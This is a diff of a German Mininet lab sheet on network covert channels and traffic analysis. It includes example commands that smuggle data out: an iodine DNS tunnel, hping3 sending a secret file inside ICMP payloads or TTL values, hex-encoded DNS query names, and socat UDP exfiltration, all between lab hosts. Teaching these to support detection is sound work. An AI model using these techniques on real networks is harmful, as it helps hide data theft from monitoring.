@@ -23,8 +23,8 @@
 
     `h1` und `h2` teilen sich das Dateisystem des Desktops (nur die
     Netzwerk-Namensräume unterscheiden sich), also stehen die Programme
-    auch in den Knoten bereit. Von den Knoten selbst erreicht nur `h1` das
-    Internet; auf `h2` schlägt ein `apt install` fehl.
+    auch in den Knoten bereit. In den Knoten wird nichts installiert;
+    installiert wird ausschließlich im Desktop-Terminal.
 
 ## Lernziele
 
@@ -66,14 +66,16 @@ cd ~/rn-practice/topo01
 ./start-topo01.sh
 ```
 
-1. Öffnet auf `h1` einen xterm und startet dort einen Mitschnitt auf allen
-    Interfaces:
+1. Öffnet für `h1` ein Terminal (`mininet> xterm h1`, siehe
+    [Lab 01](01-netzwerkgrundlagen-tools.md)) und startet dort einen
+    Mitschnitt auf allen Interfaces:
 
     ```bash
     h1$ sudo tcpdump -i any -w h1.pcap
     ```
 
-2. Erzeugt auf `h1` in einem zweiten Terminal Verkehr gegen `h2`
+2. Öffnet für `h1` ein weiteres Terminal (`mininet> xterm h1`; das erste
+    Fenster läuft weiter für den Mitschnitt) und erzeugt dort Verkehr gegen `h2`
     (`10.0.6.2`, ueber `r1`/`r2` geroutet) und loest einen externen Namen
     ueber den von `topo01` eingetragenen Resolver auf (Weg nach draussen
     ueber den NAT-Uplink von `h1`):
@@ -85,17 +87,27 @@ cd ~/rn-practice/topo01
     h1$ curl becke.net
     ```
 
-3. Wiederholt dieselben Aufrufarten auf `h2` - hier ist `h1` (`10.0.1.2`) das
-    erreichbare Ziel, `h2` hat keinen eigenen NAT-Uplink:
+3. Auf `h2` - hier ist `h1` (`10.0.1.2`) das erreichbare Ziel, `h2` hat
+    keinen eigenen NAT-Uplink - genügt:
 
     ```bash
     h2$ ping -c 4 10.0.1.2
+    h2$ dig h1
     ```
 
-    und vergleicht den Unterschied im Mitschnitt.
+    `curl becke.net` läuft auf `h2` ins Leere (kein Uplink); `dig becke.net`
+    wird über den Resolver auf `h1` beantwortet. Vergleicht, wie sich die
+    Pakete im Mitschnitt unterscheiden.
 
-4. Beendet den Mitschnitt auf `h1` (++ctrl+c++) und öffnet die Datei in
-    Wireshark:
+4. Beendet den Mitschnitt auf `h1` (++ctrl+c++ im Fenster des Mitschnitts)
+    und öffnet die Datei in Wireshark:
+
+    !!! warning "Prozesse beenden: nie `pkill` oder `killall`"
+        Nie `pkill`/`killall` benutzen – die Mininet-Knoten teilen sich die
+        Prozessliste mit eurem Desktop; `pkill` kann euren ganzen Desktop
+        beenden und euch abmelden. Beendet Prozesse mit ++ctrl+c++ oder
+        `kill <PID>`. Ein mit `&` gestarteter Hintergrundprozess lässt sich
+        mit `kill <PID>` beenden (die PID zeigt `jobs -l`).
 
     ```bash
     h1$ wireshark h1.pcap
@@ -131,6 +143,10 @@ cd ~/rn-practice/topo01
 **Ziel:** Ein Tunnel über DNS-Anfragen soll aufgebaut, genutzt und in
 Wireshark sichtbar gemacht werden.
 
+Öffnet für `h1` ein zweites Terminal (`mininet> xterm h1`, siehe
+[Lab 01](01-netzwerkgrundlagen-tools.md)): Der Server in Schritt 1 belegt das
+erste `h1`-Fenster, der Mitschnitt aus Schritt 3 braucht das zweite.
+
 1. `iodine` sollte bereits installiert sein (siehe Hinweis oben – vor dem
     Start von `topo01`, im Desktop-Terminal). Auf `h1` fehlt zusätzlich das
     Tunnel-Gerät `/dev/net/tun`, das im Container-Image standardmäßig nicht
@@ -143,8 +159,11 @@ Wireshark sichtbar gemacht werden.
     h1$ sudo mkdir -p /dev/net && sudo mknod /dev/net/tun c 10 200 && sudo chmod 666 /dev/net/tun
     ```
 
+    Erscheint die Meldung `File exists`, ist das Gerät schon da; dann reicht
+    `sudo chmod 666 /dev/net/tun`.
+
     Startet danach den Server – das ist `iodined`, **nicht** `iodine` (das
-    ist der Client für Schritt 3):
+    ist der Client für Schritt 4):
 
     ```bash
     h1$ sudo iodined -f -p 5354 -P geheim123 10.99.0.1 tunnel.h1
@@ -157,19 +176,21 @@ Wireshark sichtbar gemacht werden.
     auf Port 53. Anfragen für `tunnel.h1` reicht er an `iodined` auf Port
     5354 weiter – deshalb startet der Server oben mit `-p 5354`.
 
-3. Verbindet euch auf `h2` als Client (mit demselben Passwort und demselben
+3. Startet im zweiten `h1`-Terminal **vor** dem Tunnelaufbau einen gezielten
+    Mitschnitt auf DNS-Verkehr (beenden mit ++ctrl+c++, wenn ihr genug
+    Verkehr habt):
+
+    ```bash
+    h1$ sudo tcpdump -i any port 53 -w /tmp/dnstunnel.pcap
+    ```
+
+4. Verbindet euch auf `h2` als Client (mit demselben Passwort und demselben
     Topdomain wie oben) und gebt `h1` (`10.0.1.2`) explizit als Nameserver
     an:
 
     ```bash
     h2$ sudo iodine -P geheim123 10.0.1.2 tunnel.h1
-    h2$ ping 10.99.0.1 -I dns0
-    ```
-
-4. Startet parallel auf `h1` einen gezielten Mitschnitt auf DNS-Verkehr:
-
-    ```bash
-    h1$ sudo tcpdump -i any port 53 -w /tmp/dnstunnel.pcap
+    h2$ ping -c 5 -I dns0 10.99.0.1
     ```
 
 5. Analysiert in Wireshark: Welche DNS-Resource-Record-Typen werden
@@ -200,15 +221,17 @@ bzw. TTL-Manipulation.
 
     ```bash
     h2$ echo "TOP_SECRET" > /tmp/secret.txt
-    h2$ hping3 -1 -E /tmp/secret.txt -c 5 <IP_h1>
+    h2$ hping3 -1 -E /tmp/secret.txt -c 5 10.0.1.2
     ```
 
     !!! warning "In dieser hping3-Version zusätzlich `-d <Größe>` nötig"
         `hping3` verweigert `-E` ohne eine explizit angegebene Datengröße mit
         der Fehlermeldung `Option error: -E option useless without -d`.
-        Ergänzt den Aufruf daher um `-d <Bytegröße-der-Datei>`, z. B. für eine
-        20 Byte lange Nachricht
-        `hping3 -1 -d 20 -E /tmp/secret.txt -c 5 <IP_h1>`.
+        Ergänzt den Aufruf daher um `-d <Bytegröße-der-Datei>`. Die Größe
+        ermittelt ihr mit `wc -c /tmp/secret.txt` (hier 11 Byte: `TOP_SECRET`
+        plus Zeilenumbruch):
+        `hping3 -1 -d 11 -E /tmp/secret.txt -c 5 10.0.1.2`. (Im Screenshot
+        unten steht `-d 20`; der Wert ist dort nur ein anderes Beispiel.)
 
     ![Terminalfenster "Node: h2": hping3 -1 -d 20 -E /tmp/secret.txt -c 5 10.0.1.2 mit fuenf beantworteten ICMP-Paketen und Abschlussstatistik "5 packets transmitted, 5 packets received, 0% packet loss"](../assets/screenshots/06-advanced-covert-channels/hping3-icmp-payload.png)
     *`hping3` verschickt fünf ICMP-Echo-Requests von `h2` an `h1`, deren
@@ -235,8 +258,10 @@ bzw. TTL-Manipulation.
     TTL-Wert des IP-Headers statt über die Payload:
 
     ```bash
-    h2$ hping3 -2 --ttl 65 -p 53 -c 1 <IP_h1>
+    h2$ hping3 -2 --ttl 65 -p 53 -c 1 10.0.1.2
     ```
+
+    (`65` ist der ASCII-Code von `A`.)
 
     Ein Wert, der normalerweise nur zur Pfadverfolgung dient, lässt sich so
     zweckentfremden, um (langsam, aber unauffällig) Informationen zu
@@ -294,17 +319,17 @@ Mitschnitt im Vergleich zu klassischem DNS noch sichtbar ist.
 mittels JA3-Fingerprint.
 
 1. `jq` und `tshark` sollten bereits installiert sein (siehe Hinweis oben –
-    vor dem Start von `topo01`, im Desktop-Terminal; ein `apt install`
-    direkt in `h1`/`h2` scheitert an deren fehlendem Standard-DNS-Resolver).
+    vor dem Start von `topo01`, im Desktop-Terminal; in den Knoten wird nichts
+    installiert).
 
 2. Wertet den TLS-Handshake aus einem vorhandenen Mitschnitt aus (z. B. dem
     `dns_plain.pcap`/DoH-Mitschnitt aus Teil 4, sofern er TLS-Verkehr
     enthält):
 
     ```bash
-    h1$ tshark -r /tmp/dns_plain.pcap -Y "ssl.handshake.type == 1" \
-        -T fields -e ip.src -e ssl.handshake.extensions_server_name \
-        -e ssl.handshake.ciphersuite -e ssl.handshake.version
+    h1$ tshark -r /tmp/dns_plain.pcap -Y "tls.handshake.type == 1" \
+        -T fields -e ip.src -e tls.handshake.extensions_server_name \
+        -e tls.handshake.ciphersuite -e tls.handshake.version
     ```
 
 3. Notiert Unterschiede zwischen `curl`, `wget` und Firefox beim
@@ -312,8 +337,10 @@ mittels JA3-Fingerprint.
     ist die Grundlage, auf der ein JA3-Fingerprint einen Client eindeutig
     erkennen kann, ganz ohne den Server-Namen (SNI) auszuwerten.
 
-4. **Erweiterung:** Nutzt ein Python-Modul wie `pyja3`, um aus den obigen
-    Feldern direkt den JA3-Hash zu berechnen.
+4. **Erweiterung (optional, Rechercheaufgabe):** Ein Python-Modul wie `pyja3`
+    berechnet aus den obigen Feldern direkt den JA3-Hash. Es ist im Image
+    nicht installiert und in den Knoten ohne Internet nicht nachladbar;
+    recherchiert daher, wie der Hash aus den Feldern zusammengesetzt wird.
 
 !!! example "Vertiefung (optional): Zwei Programme, zwei Fingerabdrücke"
     Nehmt dasselbe Ziel noch einmal auf, aber mit einem **anderen** Programm –
@@ -409,11 +436,15 @@ Systemuhr zu verstellen.
     Dasselbe mit `curl` (hier ist der Rückgabecode 60 der Beleg):
 
     ```bash
-    curl -sS -o /dev/null -w '%{http_code}\n' --cacert c.pem https://localhost:8443/
-    faketime -f '+3d' curl -sS -o /dev/null -w '%{http_code}\n' --cacert c.pem https://localhost:8443/
+    curl -sS -o /dev/null -w '%{http_code}\n' --cacert c.pem https://localhost:8443/; echo "Exit: $?"
+    faketime -f '+3d' curl -sS -o /dev/null -w '%{http_code}\n' --cacert c.pem https://localhost:8443/; echo "Exit: $?"
     ```
 
-    Beendet den Server danach mit `kill %1`.
+    *Erwartet:* beim ersten Aufruf `200` und `Exit: 0`. Beim zweiten Aufruf
+    (Uhr drei Tage vor) `000` (keine Antwort), die Meldung `curl: (60) SSL
+    certificate problem: certificate has expired` und `Exit: 60`.
+
+    Beendet den Server danach: `jobs -l` zeigt seine PID, dann `kill <PID>`.
 
 4. **Ein echter Server im Internet** (nur wenn euer Knoten das Internet
     erreicht, z. B. `h1`):
@@ -515,9 +546,11 @@ cd ~/rn-practice/topo01
     **nicht** der von `h2` gesendete Wert, sondern der bereits um die Anzahl
     der durchlaufenen Router verminderte Wert – bestimmt diese Hop-Zahl
     selbst mit `traceroute` (oder `tracepath`) von `h2` zu `h1`, bevor ihr
-    zurückrechnet.
+    zurückrechnet. Gemeint ist die Zahl der **Router** auf dem Weg: Die
+    Zeilen von `traceroute` minus 1 (die letzte Zeile ist `h1` selbst), hier
+    also 2 (`r2` und `r1`). Nur Router vermindern die TTL.
 
-4. **Rückrechnen.** Addiert die ermittelte Hop-Zahl auf jeden beobachteten
+4. **Rückrechnen.** Addiert die ermittelte Router-Zahl auf jeden beobachteten
     TTL-Wert und wandelt das Ergebnis mit der ASCII-Tabelle (oder
     `printf "\x$(printf %x <Zahl>)"`) zurück in ein Zeichen. Reiht die
     Zeichen in der Reihenfolge auf, in der die Pakete eingetroffen sind.
@@ -556,7 +589,11 @@ h2$ msg=$(printf 'Hallo' | od -An -tx1 | tr -d ' ')   # -> 48616c6c6f
 h2$ dig @10.0.1.2 -p 5353 "$msg.exfil.h1"
 ```
 
-Beendet den Mitschnitt (`sudo pkill tcpdump`) und lest die Abfragenamen aus:
+`dig` zeigt `status: NXDOMAIN`. Das ist hier richtig: Der Server kennt den
+Namen nicht, aber die Daten sind in der Anfrage schon angekommen.
+
+Beendet den Mitschnitt auf `h1`: `jobs -l` zeigt die PID von `tcpdump`;
+beendet ihn mit `kill <PID>`. Lest dann die Abfragenamen aus:
 
 ```bash
 h1$ tcpdump -r /tmp/dnschan.pcap -n | grep exfil
@@ -689,7 +726,7 @@ Schaut euch die Nachrichtentypen im Mitschnitt an:
 h1$ tcpdump -r /tmp/icmpts.pcap -v -n | grep -i 'time stamp'
 ```
 
-**Aufgabe:** Ihr solltet `time stamp request` und `time stamp reply` sehen –
+**Aufgabe:** Ihr solltet `time stamp query` und `time stamp reply` sehen –
 nicht das gewohnte `echo request`. Die Timestamp-Nachricht trägt drei
 sender­bestimmte 32-Bit-Zeitfelder (RFC 792). Überlegt (als Denkaufgabe, nicht
 als belegte Praxis): warum wären diese drei Felder *strukturell* geeignet, um
@@ -710,9 +747,8 @@ legitimer ICMP-Typ schwerer zu bemerken als offensichtlicher Sonderverkehr?
 
 ### Teil 12 – Klartext trotz TLS: die Ziel-Domain (SNI) mitlesen (`topo01`)
 
-Teil 5 wollte für JA3-Fingerprinting `tshark` nachinstallieren. Ein Kernpunkt
-lässt sich aber schon **ohne** `tshark` zeigen, nur mit `openssl` und
-`tcpdump`: Der Name des Servers, zu dem sich ein Client verbindet, wird als
+Ein Kernpunkt von TLS-Fingerprinting (Teil 5) lässt sich auch ganz **ohne**
+`tshark` zeigen, nur mit `openssl` und `tcpdump`: Der Name des Servers, zu dem sich ein Client verbindet, wird als
 *Server Name Indication* (SNI) im TLS-`ClientHello` übertragen (definiert in
 RFC 6066, Abschnitt 3) – und zwar **im Klartext**, noch bevor irgendetwas
 verschlüsselt wird (RFC 8744, Abschnitt 2: „The SNI extension is carried in
@@ -784,6 +820,11 @@ h1$ socat -u UDP-RECV:9999 -
 h2$ echo 'EXFIL_UDP' | socat - UDP-SENDTO:10.0.1.2:9999
 ```
 
+Startet `socat` im zweiten `h1`-Terminal (`mininet> xterm h1`) und beendet es
+dort mit ++ctrl+c++. Beendet den Mitschnitt im ersten Fenster: `jobs -l` zeigt
+die PID von `tcpdump`, dann `kill <PID>`. Erst danach lest ihr die Datei,
+sonst ist sie ggf. unvollständig.
+
 Prüft, dass die Nutzlast im Mitschnitt steht:
 
 ```bash
@@ -827,13 +868,14 @@ von Anfragen ohne Antwort), an denen ein Verteidiger einen der vorherigen
 Kanäle erkennen könnte – **ohne** eine einzige Nutzlast zu entschlüsseln.
 
 --8<-- "issue-feedback.md"
+
 ## Potenzielle Herausforderungen
 
 - **Fehlende Werkzeuge** (`iodine`, `faketime`, `tshark`, `jq`): Das
-  aktuelle Image enthält `iodine` und `faketime`. Bei einer älteren
-  Abbildversion müssen sie vor dem Start von `topo01` im Desktop-Terminal
-  nachinstalliert werden (siehe Hinweis am Blattanfang). Von den Knoten
-  erreicht nur `h1` das Internet; auf `h2` schlägt ein `apt install` fehl.
+  aktuelle Image enthält diese Werkzeuge. Bei einer älteren Abbildversion
+  müssen sie vor dem Start von `topo01` im Desktop-Terminal nachinstalliert
+  werden (siehe Hinweis am Blattanfang). In den Knoten wird nichts
+  installiert.
 - **`date -s` und `timedatectl` scheitern** (`Operation not permitted`,
   bzw. `System has not been booted with systemd …`). Das ist Absicht: Die
   Wanduhr ist nicht namespaced, sie gilt für den ganzen Knoten. Teil 6 nutzt
